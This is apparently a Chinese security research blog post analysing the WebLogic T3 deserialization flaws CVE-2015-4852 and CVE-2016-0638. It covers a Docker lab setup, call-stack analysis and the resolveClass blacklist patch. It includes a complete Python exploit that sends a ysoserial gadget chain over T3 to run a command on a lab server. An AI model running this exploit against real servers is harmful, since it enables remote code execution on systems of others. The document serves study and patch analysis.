<p><strong>数据交换过程</strong>：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801182042.png"><br><strong>结构</strong>：<br>T3协议中包含请求包头和请求包体两部分<br>请求头：<br>以下面的CVE-2015-4852中的exp请求为例，第一步客户端向服务器发送请求头，得到服务端的响应，抓包分析：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i ens160 port 7001 -w t3.pcap</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 表示协议版本号或者数据包类型等信息的字段</span></span><br><span class="line">t3 <span class="number">12.2</span><span class="number">.3</span></span><br><span class="line"><span class="comment">// 标识了发送的序列化数据的容量</span></span><br><span class="line">AS:<span class="number">255</span></span><br><span class="line"><span class="comment">// 标识自己后面发起的t3的协议头长度</span></span><br><span class="line">HL:<span class="number">19</span></span><br><span class="line"><span class="comment">// Maximum Segment Size</span></span><br><span class="line">MS:<span class="number">10000000</span></span><br></pre></td></tr></table></figure>

<p>服务端的响应：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HELO:<span class="number">10.3</span><span class="number">.6</span><span class="number">.0</span>.<span class="literal">false</span></span><br><span class="line">AS:<span class="number">2048</span></span><br><span class="line">HL:<span class="number">19</span></span><br></pre></td></tr></table></figure>

<p>HELO后面会返回一个weblogic版本号<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801144420.png"><br>请求体：<br>蓝色部分就是响应，下面部分就是请求体，构造的恶意类就在其中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801145708.png"><br>请求头+请求体：</p>
<ul>
<li>每个T3数据包中都包含T3协议头</li>
<li>数据包的前4个字节标识了数据包的长度</li>
<li>序列化数据的头部二进制为aced0005</li>
<li>长度标识后面的一个字节标识了该数据包是请求还是响应，01表示请求，02表示响应</li>
</ul>
<p>根据T3协议的特点，在攻击的时候只需要将恶意的反序列化数据进行拼接即可，参考一张图：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801150754.png"></p>
<h3 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h3><p><strong>环境搭建</strong>：<br>使用QAX-A-Team的weblogic搭建环境：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a><br>同时需要下载JDK和weblogic，并将其对应放入项目的jdk文件夹和weblogic文件夹，版本的兼容性测试在项目的README文件兼容性测试中提到，按照要求下载对应版本即可<br>构建docker并运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar -t weblogic1036jdk7u21 .</span><br><span class="line">sudo docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://10.140.32.159:33401/console/login/LoginForm.jsp%EF%BC%8C%E7%94%A8%E6%88%B7%E5%90%8Dweblogic%EF%BC%8C%E5%AF%86%E7%A0%81%EF%BC%9Aqaxateam01">http://10.140.32.159:33401/console/login/LoginForm.jsp，用户名weblogic，密码：qaxateam01</a><br>设置远程调试：<br>运行对应版本的sh脚本，安装远程调试并从docker中导出jar包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./run_weblogic1036jdk7u21.sh</span><br></pre></td></tr></table></figure>

<p>在项目目录中会生成middleware文件夹，将其导出放入IDEA中并配置远程调试<br>新建一个IDEA项目，导入modules和wlserver，建立远程运行<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230731144444.png"><br>测试：在weblogic&#x2F;rjvm&#x2F;InboundMsgAbbrev.class的readObject函数中下断点，使用<a href="https://github.com/rabbitmask/WeblogicScan.git">weblogic漏洞扫描工具</a>扫描<br>最后能够停在断点处则表示远程调试设置成功</p>
<p><strong>漏洞复现</strong>：<br>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAR_FILE = <span class="string">&#x27;../ysoserial-all.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;C:/Program Files/Java/jdk1.7.0_80/bin/java.exe&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;10.140.32.159&quot;</span></span><br><span class="line">    port = <span class="number">33401</span></span><br><span class="line">    gadget = <span class="string">&quot;Jdk7u21&quot;</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">&quot;touch /tmp/CVE-2015-4852&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure>

<p>执行完成后，查询是否新建CVE-2015-4852文件<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230731165503.png"><br>命令执行成功</p>
<p><strong>漏洞分析</strong>：<br>在weblogic&#x2F;rjvm&#x2F;InboundMsgAbbrev.class的readObject函数中下断点，执行exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">readObject</span><span class="params">(MsgAbbrevInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 从输入流var1中读取一个字节，并将其赋值给变量var2，该字节表示序列化对象的类型</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> var1.read();</span><br><span class="line">    <span class="keyword">switch</span> (var2) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="comment">// 需要读取一个自定义的序列化类型的对象</span></span><br><span class="line">            <span class="comment">// 进入这里</span></span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">ServerChannelInputStream</span>(var1)).readObject();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="comment">// 表示需要读取一个ASCII字符串</span></span><br><span class="line">            <span class="keyword">return</span> var1.readASCII();</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;Unknown typecode: &#x27;&quot;</span> + var2 + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于var2的值是0，所以会进入ServerChannelInputStream的readObject函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230731175814.png"><br>这里的ServerChannelInputStream是一个内部类，实现如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ServerChannelInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> <span class="keyword">implements</span> <span class="title class_">ServerChannelStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ServerChannel serverChannel;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ServerChannelInputStream</span><span class="params">(MsgAbbrevInputStream var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(var1);</span><br><span class="line">        <span class="built_in">this</span>.serverChannel = var1.getServerChannel();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ServerChannel <span class="title function_">getServerChannel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.serverChannel;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是ServerChannelInputStream类重写的ObjectInputStream类的方法，它在反序列化Java对象时负责解析类，将类的序列化描述符加工成该类的Class对象</span></span><br><span class="line">    <span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass var1)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="comment">// 调用父类的resolveClass方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.resolveClass(var1);</span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;super.resolveClass returns null.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ObjectStreamClass</span> <span class="variable">var3</span> <span class="operator">=</span> ObjectStreamClass.lookup(var2);</span><br><span class="line">            <span class="comment">// 检查解析出来的Java类与要解析的类是否具有相同的serialVersionUID</span></span><br><span class="line">            <span class="keyword">if</span> (var3 != <span class="literal">null</span> &amp;&amp; var3.getSerialVersionUID() != var1.getSerialVersionUID()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;different serialVersionUID. local: &quot;</span> + var3.getSerialVersionUID() + <span class="string">&quot; remote: &quot;</span> + var1.getSerialVersionUID());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> var2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中在构造方法中，调用getServerChannel函数处理T3协议，获取socket相关信息<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801095953.png"><br>父类(即ObjectInputStream)的resolveClass方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中通过Class.forName，根据类名来获取对应类的Class对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801000434.png"><br>函数调用链：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">resolveClass:<span class="number">108</span>, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)</span><br><span class="line">readNonProxyDesc:<span class="number">1610</span>, ObjectInputStream (java.io)</span><br><span class="line">readClassDesc:<span class="number">1515</span>, ObjectInputStream (java.io)</span><br><span class="line">readClass:<span class="number">1481</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1331</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">1989</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadObject:<span class="number">499</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">331</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">1989</span>, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:<span class="number">1913</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">308</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">66</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">38</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">213</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">387</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">967</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">899</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>接下来就是ysoserial中Jdk7u21链的部分，这里可以更改exp中的参数，使用CC链也可<br>这里将gadget参数更改为CommonsCollections1，使用CC1链<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transform:<span class="number">125</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">157</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:<span class="number">69</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy96 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">346</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:-<span class="number">1</span>, GeneratedMethodAccessor89 (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">66</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">38</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">213</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">387</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">967</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">899</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801173538.png"></p>
<p><strong>修复</strong>：<br>在出现这个漏洞之后，weblogic增加了一些安全防护，防护方案主要从resolveClass入手，如图：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801155140.png"><br>由上面可知，resolveClass函数的作用是从类序列化描述符获取类的Class对象，而具体的防御措施就是在这个函数中增加一个检查，检测序列化描述符是否出现在设置的黑名单中<br><strong>总结</strong>：<br>weblogic反序列化攻击流程图：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801204957.png"><br>反序列化攻击时序图：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801205137.png"><br><strong>参考</strong>：<br><a href="https://xz.aliyun.com/t/10563">WeblogicT3反序列化浅析之cve-2015-4852</a><br><a href="https://xz.aliyun.com/t/9216">Weblogic反序列化漏洞利用入门——CVE-2015-4852</a></p>
<h3 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h3><p><strong>环境搭建</strong>：<br>在CVE-2015-4852环境的基础上打上补丁p20780171_1036_Generic和p22248372_1036012_Generic，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="built_in">cp</span> ./p20780171_1036_Generic weblogic1036jdk7u21:/p20780171_1036_Generic</span><br><span class="line">sudo docker <span class="built_in">cp</span> ./p22248372_1036012_Generic  weblogic1036jdk7u21:/p22248372_1036012_Generic</span><br><span class="line"></span><br><span class="line">sudo docker <span class="built_in">exec</span> -it weblogic1036jdk7u21 /bin/bash</span><br><span class="line"><span class="built_in">cd</span> /u01/app/oracle/middleware/utils/bsu</span><br><span class="line"><span class="built_in">mkdir</span> cache_dir</span><br><span class="line">vi bsu.sh   编辑MEM_ARGS参数为1024</span><br><span class="line"><span class="built_in">cp</span> /p20780171_1036_Generic/* cache_dir/</span><br><span class="line">./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist=EJUW -prod_dir=/u01/app/oracle/middleware/wlserver/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> /p22248372_1036012_Generic/* cache_dir/</span><br><span class="line">./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist=ZLNA  -prod_dir=/u01/app/oracle/middleware/wlserver/ –verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230802170926.png"><br>重启weblogic服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh</span><br></pre></td></tr></table></figure>

<p>有可能使用上面命令无法重启weblogic服务，可以使用stopWeblogic.sh先关闭服务，此时容器应该也会关闭，重新启动容器即可<br>测试补丁是否打成功，继续使用CVE-2015-4852的exp，观察是否创建文件<br>设置远程调试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> wlserver1036</span><br><span class="line"><span class="built_in">mkdir</span> coherence_3.7</span><br><span class="line">docker <span class="built_in">cp</span> weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./wlserver1036</span><br><span class="line">docker <span class="built_in">cp</span> weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver/server/lib ./wlserver1036</span><br><span class="line">docker <span class="built_in">cp</span> weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib</span><br></pre></td></tr></table></figure>

<p>将这些包导入IDA，设置远程IP和端口，详细过程参考CVE-2015-4852远程配置<br><strong>补丁分析</strong>：<br>分析InboundMsgAbbrev.class的resolveClass函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass descriptor)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> descriptor.getName();</span><br><span class="line">    <span class="comment">// 该类名在ClassFilter.isBlackListed()方法中被列入黑名单，则抛出InvalidClassException异常，表示反序列化未被授权</span></span><br><span class="line">    <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() &gt; <span class="number">0</span> &amp;&amp; ClassFilter.isBlackListed(className)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, descriptor.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果className不在黑名单中，则调用父类的resolveClass方法来解析该类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> <span class="built_in">super</span>.resolveClass(descriptor);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;super.resolveClass returns null.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ObjectStreamClass</span> <span class="variable">localDesc</span> <span class="operator">=</span> ObjectStreamClass.lookup(c);</span><br><span class="line">            <span class="keyword">if</span> (localDesc != <span class="literal">null</span> &amp;&amp; localDesc.getSerialVersionUID() != descriptor.getSerialVersionUID()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;different serialVersionUID. local: &quot;</span> + localDesc.getSerialVersionUID() + <span class="string">&quot; remote: &quot;</span> + descriptor.getSerialVersionUID());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此这里重点需要关注ClassFilter.isBlackListed函数，在CVE-2015-4852的研究中也提到，在防御过程中可以从resolveClass入手，在这两个补丁中则增加对传入的类名的判断。</p>
<p>继续使用CVE-2015-4852的exp进行测试，在weblogic&#x2F;rjvm&#x2F;InboundMsgAbbrev.class的resolveClass函数中下断点，F7单步进入来到weblogic&#x2F;rmi&#x2F;ClassFilter.class的isBlackListed函数，这个函数主要作用是判断传进来的类名是否在黑名单中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isBlackListed</span><span class="params">(String className)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查className的长度是否大于0，并且是否在BLACK_LIST（一个常量Set集合）中</span></span><br><span class="line">    <span class="keyword">if</span> (className.length() &gt; <span class="number">0</span> &amp;&amp; BLACK_LIST.contains(className)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String pkgName;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 找到最后一个“.”（点号）的位置，获取类名的包名部分</span></span><br><span class="line">            pkgName = className.substring(<span class="number">0</span>, className.lastIndexOf(<span class="number">46</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果获取包名成功，并且包名的长度大于0，那么再次检查pkgName是否在BLACK_LIST中</span></span><br><span class="line">        <span class="keyword">return</span> pkgName.length() &gt; <span class="number">0</span> &amp;&amp; BLACK_LIST.contains(pkgName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中BLACK_LIST包含的值如下：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230802231450.png"><br>这个HashSet的由来是在调用ClassFilter中的静态类方法前，会先执行static构造方法，将这些设定的类名存入BLACK_LIST中</p>
